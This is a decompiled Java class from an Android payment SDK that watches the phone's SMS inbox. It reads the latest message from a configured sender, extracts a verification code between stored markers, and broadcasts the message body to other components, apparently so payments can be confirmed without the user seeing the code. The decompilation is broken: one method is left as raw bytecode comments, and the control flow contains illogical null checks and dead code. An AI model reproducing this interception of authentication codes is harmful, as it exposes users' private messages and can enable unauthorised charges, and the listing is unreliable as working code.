package com.zhangzhifu.sdk.util.sms.util;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import com.zhangzhifu.sdk.db.SharePreferUtil;
import java.io.PrintStream;

public class SmsAuthCode
  extends ContentObserver
{
  private Cursor fN = null;
  private Context mContext;
  private Handler mHandler;
  
  public SmsAuthCode(Context paramContext, Handler paramHandler)
  {
    super(paramHandler);
    this.mContext = paramContext;
    this.mHandler = paramHandler;
  }
  
  /* Error */
  public static String getDynamicPassword(Context paramContext, String paramString)
  {
    // Byte code:
    //   0: invokestatic 32	com/zhangzhifu/sdk/db/SharePreferUtil:getInstance	()Lcom/zhangzhifu/sdk/db/SharePreferUtil;
    //   3: aload_0
    //   4: invokevirtual 36	com/zhangzhifu/sdk/db/SharePreferUtil:getSmsCodeBegin	(Landroid/content/Context;)Ljava/lang/String;
    //   7: astore_3
    //   8: invokestatic 32	com/zhangzhifu/sdk/db/SharePreferUtil:getInstance	()Lcom/zhangzhifu/sdk/db/SharePreferUtil;
    //   11: aload_0
    //   12: invokevirtual 39	com/zhangzhifu/sdk/db/SharePreferUtil:getSmsCodeEnd	(Landroid/content/Context;)Ljava/lang/String;
    //   15: astore 4
    //   17: aload_1
    //   18: aload_3
    //   19: invokevirtual 45	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   22: istore_2
    //   23: aload_1
    //   24: aload_3
    //   25: invokevirtual 49	java/lang/String:length	()I
    //   28: iload_2
    //   29: iadd
    //   30: aload_1
    //   31: aload 4
    //   33: invokevirtual 45	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   36: invokevirtual 53	java/lang/String:substring	(II)Ljava/lang/String;
    //   39: astore_1
    //   40: invokestatic 32	com/zhangzhifu/sdk/db/SharePreferUtil:getInstance	()Lcom/zhangzhifu/sdk/db/SharePreferUtil;
    //   43: aload_0
    //   44: aload_1
    //   45: invokevirtual 57	com/zhangzhifu/sdk/db/SharePreferUtil:setSmsCode	(Landroid/content/Context;Ljava/lang/String;)V
    //   48: aload_1
    //   49: areturn
    //   50: astore_0
    //   51: ldc 59
    //   53: astore_1
    //   54: aload_0
    //   55: invokevirtual 63	java/lang/Exception:printStackTrace	()V
    //   58: aload_1
    //   59: areturn
    //   60: astore_0
    //   61: goto -7 -> 54
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	64	0	paramContext	Context
    //   0	64	1	paramString	String
    //   22	8	2	i	int
    //   7	18	3	str1	String
    //   15	17	4	str2	String
    // Exception table:
    //   from	to	target	type
    //   0	40	50	java/lang/Exception
    //   40	48	60	java/lang/Exception
  }
  
  public void onChange(boolean paramBoolean)
  {
    super.onChange(paramBoolean);
    Object localObject1 = Uri.parse("content://sms/inbox");
    Object localObject2;
    if (this.mContext != null)
    {
      localObject2 = SharePreferUtil.getInstance().getFilterPort(this.mContext);
      if ((localObject2 != null) || (((String)localObject2).equals("")))
      {
        this.fN = this.mContext.getContentResolver().query((Uri)localObject1, null, null, null, "_id desc");
        this.fN = this.mContext.getContentResolver().query((Uri)localObject1, null, "address=?", new String[] { localObject2 }, "_id desc");
      }
    }
    for (;;)
    {
      if ((this.fN != null) && (this.fN.getCount() > 0))
      {
        new ContentValues().put("read", "1");
        this.fN.moveToNext();
      }
      try
      {
        localObject1 = this.fN.getString(this.fN.getColumnIndex("body"));
        long l = Long.parseLong(this.fN.getString(this.fN.getColumnIndex("timestamp")));
        localObject2 = new Intent();
        ((Intent)localObject2).setAction("system.sms.authcode");
        ((Intent)localObject2).putExtra("sysSMS_Body", (String)localObject1);
        ((Intent)localObject2).putExtra("sysSMS_Time", l);
        this.mContext.sendBroadcast((Intent)localObject2);
        return;
      }
      catch (NumberFormatException localNumberFormatException)
      {
        System.out.println("系统短信未获取到.............");
      }
      System.out.println("Context为空！！！");
    }
  }
}
